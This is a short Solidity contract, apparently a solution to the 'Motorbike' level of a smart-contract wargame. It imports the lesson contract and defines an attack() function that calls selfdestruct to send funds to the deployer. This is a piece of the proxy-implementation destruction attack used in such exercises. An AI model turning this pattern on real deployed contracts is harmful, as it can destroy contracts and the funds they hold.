// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "../lessons/25-Motorbike.sol";

contract MotorbikeAttack {
    Motorbike motorbike;
    address payable owner;

    constructor(address payable motorbikeAddress) public {
        motorbike = Motorbike(motorbikeAddress);
        owner = msg.sender;
    }

    function attack() public {
        selfdestruct(owner);
    }
}
